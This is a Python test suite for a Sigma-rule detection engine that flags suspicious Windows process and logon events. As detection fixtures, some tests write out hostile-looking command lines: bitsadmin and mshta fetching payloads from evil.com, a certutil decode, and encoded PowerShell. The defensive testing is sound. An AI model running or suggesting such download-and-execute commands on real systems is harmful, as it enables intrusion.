"""Tests for detection/sigma_engine.py."""

import copy
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from detection.sigma_engine import SigmaEngine, _RULES, _match_condition, _REQUIRED_ALERT_KEYS


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _event(event_id: int, *, src_ip: str = "192.168.1.10", dst_ip: str = "10.0.0.5",
           event_type: str = "winlog_event", severity: int = 5,
           command_line: str | None = None, image: str | None = None,
           parent_image: str | None = None, logon_type: str | None = None,
           target_user: str | None = None, subject_user: str | None = None,
           enrichment: dict | None = None, extra_meta: dict | None = None) -> dict:
    """Build a minimal enriched event dict for testing."""
    meta: dict = {"event_id": event_id}
    if command_line is not None:
        meta["command_line"] = command_line
    if image is not None:
        meta["image"] = image
    if parent_image is not None:
        meta["parent_image"] = parent_image
    if logon_type is not None:
        meta["logon_type"] = logon_type
    if target_user is not None:
        meta["target_user"] = target_user
    if subject_user is not None:
        meta["subject_user"] = subject_user
    if enrichment is not None:
        meta["enrichment"] = enrichment
    if extra_meta:
        meta.update(extra_meta)
    return {
        "timestamp":   "2026-01-15T10:00:00Z",
        "source_type": "winlog",
        "src_ip":      src_ip,
        "dst_ip":      dst_ip,
        "event_type":  event_type,
        "severity":    severity,
        "metadata":    meta,
    }


# ---------------------------------------------------------------------------
# Fixtures: one per rule trigger scenario
# ---------------------------------------------------------------------------

@pytest.fixture
def lolbin_event():
    return _event(4688, command_line="certutil -decode encoded.txt output.exe",
                  image="C:\\Windows\\System32\\certutil.exe")

@pytest.fixture
def wmi_spawn_event():
    return _event(4688, parent_image="C:\\Windows\\System32\\wbem\\wmiprvse.exe",
                  image="C:\\Windows\\System32\\cmd.exe",
                  command_line="cmd.exe /c net user")

@pytest.fixture
def ps_encoded_event():
    return _event(4688,
                  image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  command_line="powershell.exe -enc JABj...")

@pytest.fixture
def office_spawn_event():
    return _event(4688,
                  image="C:\\Windows\\System32\\cmd.exe",
                  parent_image="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                  command_line="cmd.exe /c mshta")

@pytest.fixture
def explicit_cred_event():
    return _event(4648, event_type="explicit_credential_logon")

@pytest.fixture
def service_4697_event():
    return _event(4697, event_type="service_installed")

@pytest.fixture
def service_7045_event():
    return _event(7045, event_type="new_service_installed")

@pytest.fixture
def scheduled_task_event():
    return _event(4698, event_type="scheduled_task_created")

@pytest.fixture
def kerberos_preauth_event():
    return _event(4771, event_type="kerberos_preauth_failure")

@pytest.fixture
def machine_account_logon_event():
    return _event(4624, logon_type="3", target_user="DC01$",
                  event_type="authentication_success")

@pytest.fixture
def external_ip_logon_event():
    return _event(4624, src_ip="185.220.101.45", logon_type="3",
                  target_user="administrator", event_type="authentication_success")

@pytest.fixture
def benign_event():
    return _event(4624, logon_type="2", target_user="jdoe",
                  event_type="authentication_success",
                  src_ip="192.168.1.5")

@pytest.fixture
def engine():
    return SigmaEngine()


# ---------------------------------------------------------------------------
# Engine: basic contract
# ---------------------------------------------------------------------------

class TestSigmaEngineContract:
    def test_empty_events_returns_empty_list(self, engine):
        assert engine.detect([]) == []

    def test_returns_list(self, engine, benign_event):
        result = engine.detect([benign_event])
        assert isinstance(result, list)

    def test_does_not_mutate_input_events(self, engine, lolbin_event):
        original = copy.deepcopy(lolbin_event)
        engine.detect([lolbin_event])
        assert lolbin_event == original

    def test_alert_contains_required_keys(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        assert alerts, "expected at least one alert"
        for alert in alerts:
            missing = _REQUIRED_ALERT_KEYS - set(alert)
            assert not missing, f"alert missing keys: {missing}"

    def test_alert_type_is_sigma_rule_match(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        assert all(a["alert_type"] == "sigma_rule_match" for a in alerts)

    def test_source_field_is_sigma_engine(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        assert all(a["source"] == "sigma_engine" for a in alerts)

    def test_confidence_in_range(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        for a in alerts:
            assert 0.0 <= a["confidence"] <= 1.0

    def test_severity_is_int(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        for a in alerts:
            assert isinstance(a["severity"], int)

    def test_matched_fields_is_dict(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        for a in alerts:
            assert isinstance(a["matched_fields"], dict)

    def test_src_dst_ip_copied_from_event(self, engine, lolbin_event):
        alerts = engine.detect([lolbin_event])
        assert all(a["src_ip"] == "192.168.1.10" for a in alerts)
        assert all(a["dst_ip"] == "10.0.0.5" for a in alerts)


# ---------------------------------------------------------------------------
# Individual rule triggers
# ---------------------------------------------------------------------------

class TestRuleTriggers:
    def _rule_ids(self, alerts):
        return {a["rule_id"] for a in alerts}

    def test_sf_sig_001_lolbin_certutil(self, engine, lolbin_event):
        assert "SF-SIG-001" in self._rule_ids(engine.detect([lolbin_event]))

    def test_sf_sig_001_lolbin_bitsadmin(self, engine):
        ev = _event(4688, command_line="bitsadmin /transfer job http://evil.com/file.exe C:\\file.exe")
        assert "SF-SIG-001" in self._rule_ids(engine.detect([ev]))

    def test_sf_sig_001_lolbin_mshta(self, engine):
        ev = _event(4688, command_line="mshta.exe http://evil.com/payload.hta")
        assert "SF-SIG-001" in self._rule_ids(engine.detect([ev]))

    def test_sf_sig_002_wmi_spawn(self, engine, wmi_spawn_event):
        assert "SF-SIG-002" in self._rule_ids(engine.detect([wmi_spawn_event]))

    def test_sf_sig_003_ps_encoded(self, engine, ps_encoded_event):
        assert "SF-SIG-003" in self._rule_ids(engine.detect([ps_encoded_event]))

    def test_sf_sig_003_ps_encodedcommand_flag(self, engine):
        ev = _event(4688,
                    image="powershell.exe",
                    command_line="powershell.exe -EncodedCommand JABj...")
        assert "SF-SIG-003" in self._rule_ids(engine.detect([ev]))

    def test_sf_sig_004_office_spawn(self, engine, office_spawn_event):
        assert "SF-SIG-004" in self._rule_ids(engine.detect([office_spawn_event]))

    def test_sf_sig_004_excel_spawning_wscript(self, engine):
        ev = _event(4688, image="wscript.exe",
                    parent_image="excel.exe", command_line="wscript macro.vbs")
        assert "SF-SIG-004" in self._rule_ids(engine.detect([ev]))

    def test_sf_sig_005_explicit_credential(self, engine, explicit_cred_event):
        assert "SF-SIG-005" in self._rule_ids(engine.detect([explicit_cred_event]))

    def test_sf_sig_006_service_4697(self, engine, service_4697_event):
        assert "SF-SIG-006" in self._rule_ids(engine.detect([service_4697_event]))

    def test_sf_sig_006_service_7045(self, engine, service_7045_event):
        assert "SF-SIG-006" in self._rule_ids(engine.detect([service_7045_event]))

    def test_sf_sig_007_scheduled_task(self, engine, scheduled_task_event):
        assert "SF-SIG-007" in self._rule_ids(engine.detect([scheduled_task_event]))

    def test_sf_sig_008_kerberos_preauth(self, engine, kerberos_preauth_event):
        assert "SF-SIG-008" in self._rule_ids(engine.detect([kerberos_preauth_event]))

    def test_sf_sig_009_machine_account(self, engine, machine_account_logon_event):
        assert "SF-SIG-009" in self._rule_ids(engine.detect([machine_account_logon_event]))

    def test_sf_sig_010_external_ip_logon(self, engine, external_ip_logon_event):
        assert "SF-SIG-010" in self._rule_ids(engine.detect([external_ip_logon_event]))

    def test_sf_sig_010_internal_ip_no_alert(self, engine):
        ev = _event(4624, src_ip="192.168.1.50", logon_type="3", target_user="jdoe")
        ids = self._rule_ids(engine.detect([ev]))
        assert "SF-SIG-010" not in ids

    def test_sf_sig_010_10_dot_range_no_alert(self, engine):
        ev = _event(4624, src_ip="10.0.0.50", logon_type="3", target_user="jdoe")
        ids = self._rule_ids(engine.detect([ev]))
        assert "SF-SIG-010" not in ids

    def test_benign_event_no_sigma_alerts(self, engine, benign_event):
        ids = self._rule_ids(engine.detect([benign_event]))
        # interactive logon (type 2) from internal IP should not fire any rule
        assert not ids


# ---------------------------------------------------------------------------
# Non-matching scenarios
# ---------------------------------------------------------------------------

class TestNoFalsePositives:
    def test_wrong_event_id_no_lolbin_alert(self, engine):
        ev = _event(4624, command_line="certutil -decode file.txt out.exe")
        ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-001" not in ids

    def test_ps_encoded_without_image_no_alert(self, engine):
        # CommandLine matches but Image is absent — rule 3 requires both
        ev = _event(4688, command_line="powershell.exe -enc JABj...")
        ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-003" not in ids

    def test_office_spawn_wrong_parent_no_alert(self, engine):
        ev = _event(4688, image="cmd.exe", parent_image="explorer.exe",
                    command_line="cmd.exe /c dir")
        ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-004" not in ids

    def test_machine_account_non_network_logon_no_alert(self, engine):
        ev = _event(4624, logon_type="2", target_user="DC01$")
        ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-009" not in ids

    def test_user_without_dollar_no_machine_account_alert(self, engine):
        ev = _event(4624, logon_type="3", target_user="jdoe")
        ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-009" not in ids

    def test_empty_src_ip_no_external_logon_alert(self, engine):
        ev = _event(4624, src_ip="", logon_type="3", target_user="jdoe")
        ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-010" not in ids


# ---------------------------------------------------------------------------
# Multi-event and multi-rule behaviour
# ---------------------------------------------------------------------------

class TestMultiEventBehaviour:
    def test_multiple_events_multiple_alerts(self, engine, lolbin_event, scheduled_task_event):
        alerts = engine.detect([lolbin_event, scheduled_task_event])
        rule_ids = {a["rule_id"] for a in alerts}
        assert "SF-SIG-001" in rule_ids
        assert "SF-SIG-007" in rule_ids

    def test_one_event_can_match_multiple_rules(self, engine):
        # Event 4688 with certutil and wmiprvse parent triggers rules 1 and 2
        ev = _event(4688,
                    command_line="certutil -decode file.txt out.exe",
                    parent_image="wmiprvse.exe",
                    image="certutil.exe")
        rule_ids = {a["rule_id"] for a in engine.detect([ev])}
        assert "SF-SIG-001" in rule_ids
        assert "SF-SIG-002" in rule_ids

    def test_event_timestamps_preserved_in_alerts(self, engine, scheduled_task_event):
        alerts = engine.detect([scheduled_task_event])
        assert all(a["timestamp"] == "2026-01-15T10:00:00Z" for a in alerts)


# ---------------------------------------------------------------------------
# Confidence boosting from threat intelligence
# ---------------------------------------------------------------------------

class TestConfidenceBoost:
    def test_malicious_reputation_boosts_confidence(self, engine):
        enrichment = {"src_reputation": {"reputation_score": 1.0, "is_malicious": True}}
        ev = _event(4688, command_line="certutil -decode a.txt b.exe",
                    enrichment=enrichment)
        alerts = engine.detect([ev])
        sig001 = next((a for a in alerts if a["rule_id"] == "SF-SIG-001"), None)
        assert sig001 is not None
        assert sig001["confidence"] > 0.72

    def test_zero_reputation_score_no_boost(self, engine, lolbin_event):
        base_alerts = engine.detect([lolbin_event])
        sig001_base = next(a for a in base_alerts if a["rule_id"] == "SF-SIG-001")
        assert sig001_base["confidence"] == round(0.72, 4)

    def test_confidence_capped_at_0_99(self, engine):
        enrichment = {"src_reputation": {"reputation_score": 100.0}}
        ev = _event(4688, command_line="certutil -decode a.txt b.exe",
                    enrichment=enrichment)
        alerts = engine.detect([ev])
        for alert in alerts:
            assert alert["confidence"] <= 0.99


# ---------------------------------------------------------------------------
# Rule catalogue integrity
# ---------------------------------------------------------------------------

class TestRuleCatalogue:
    def test_rule_count(self):
        assert len(_RULES) == 10

    def test_all_rule_ids_unique(self):
        ids = [r["id"] for r in _RULES]
        assert len(ids) == len(set(ids))

    def test_all_rules_have_required_keys(self):
        required = {"id", "title", "detection", "mitre_tactic", "mitre_technique", "severity", "confidence"}
        for rule in _RULES:
            missing = required - set(rule)
            assert not missing, f"Rule {rule.get('id')!r} missing keys: {missing}"

    def test_all_confidences_in_range(self):
        for rule in _RULES:
            assert 0.0 < rule["confidence"] < 1.0, f"{rule['id']} confidence out of range"

    def test_all_severities_in_range(self):
        for rule in _RULES:
            assert 0 <= rule["severity"] <= 10, f"{rule['id']} severity out of range"

    def test_all_mitre_tactics_prefixed(self):
        for rule in _RULES:
            assert rule["mitre_tactic"].startswith("TA"), (
                f"{rule['id']} mitre_tactic should start with 'TA'"
            )

    def test_all_mitre_techniques_prefixed(self):
        for rule in _RULES:
            assert rule["mitre_technique"].startswith("T"), (
                f"{rule['id']} mitre_technique should start with 'T'"
            )

    def test_all_detection_dicts_non_empty(self):
        for rule in _RULES:
            assert rule["detection"], f"{rule['id']} has empty detection dict"


# ---------------------------------------------------------------------------
# _match_condition unit tests
# ---------------------------------------------------------------------------

class TestMatchCondition:
    # Equality (no modifiers)
    def test_eq_match(self):
        assert _match_condition(4688, [], 4688) is True

    def test_eq_no_match(self):
        assert _match_condition(4624, [], 4688) is False

    def test_eq_none_value(self):
        assert _match_condition(None, [], 4688) is False

    def test_eq_list_pattern_any_match(self):
        assert _match_condition(4697, [], [4697, 7045]) is True

    # |in modifier
    def test_in_match(self):
        assert _match_condition(7045, ["in"], [4697, 7045]) is True

    def test_in_no_match(self):
        assert _match_condition(4688, ["in"], [4697, 7045]) is False

    # |contains
    def test_contains_match(self):
        assert _match_condition("certutil.exe", ["contains"], "certutil") is True

    def test_contains_case_insensitive(self):
        assert _match_condition("CERTUTIL.EXE", ["contains"], "certutil") is True

    def test_contains_list_any(self):
        assert _match_condition("wmiprvse.exe", ["contains", "any"], ["wmiprvse", "mshta"]) is True

    def test_contains_list_no_match(self):
        assert _match_condition("explorer.exe", ["contains", "any"], ["wmiprvse", "mshta"]) is False

    def test_contains_none_field_returns_false(self):
        assert _match_condition(None, ["contains"], "certutil") is False

    def test_contains_empty_field_returns_false(self):
        assert _match_condition("", ["contains"], "certutil") is False

    # |startswith
    def test_startswith_match(self):
        assert _match_condition("192.168.1.10", ["startswith"], "192.168.") is True

    def test_startswith_no_match(self):
        assert _match_condition("10.0.0.1", ["startswith"], "192.168.") is False

    def test_startswith_list_any(self):
        assert _match_condition("10.0.0.1", ["startswith", "any"], ["192.168.", "10."]) is True

    # |endswith
    def test_endswith_match(self):
        assert _match_condition("DC01$", ["endswith"], "$") is True

    def test_endswith_no_match(self):
        assert _match_condition("jdoe", ["endswith"], "$") is False

    # |not modifier
    def test_not_eq_match(self):
        assert _match_condition(4624, ["not"], 4688) is True

    def test_not_eq_no_match(self):
        assert _match_condition(4688, ["not"], 4688) is False

    def test_not_startswith_external_ip(self):
        result = _match_condition("8.8.8.8", ["not", "startswith", "any"],
                                  ["192.168.", "10.", "172.", "127.", "::1"])
        assert result is True

    def test_not_startswith_internal_ip_returns_false(self):
        result = _match_condition("192.168.1.100", ["not", "startswith", "any"],
                                  ["192.168.", "10.", "172.", "127.", "::1"])
        assert result is False

    def test_not_startswith_empty_field_returns_false(self):
        # Absent SourceIp: string op short-circuits before negate
        result = _match_condition("", ["not", "startswith", "any"],
                                  ["192.168.", "10.", "172.", "127.", "::1"])
        assert result is False

    def test_not_startswith_none_field_returns_false(self):
        result = _match_condition(None, ["not", "startswith", "any"],
                                  ["192.168.", "10.", "172.", "127.", "::1"])
        assert result is False

    # Unknown modifier
    def test_unknown_modifier_returns_false(self):
        assert _match_condition("anything", ["unknownmod"], "anything") is False
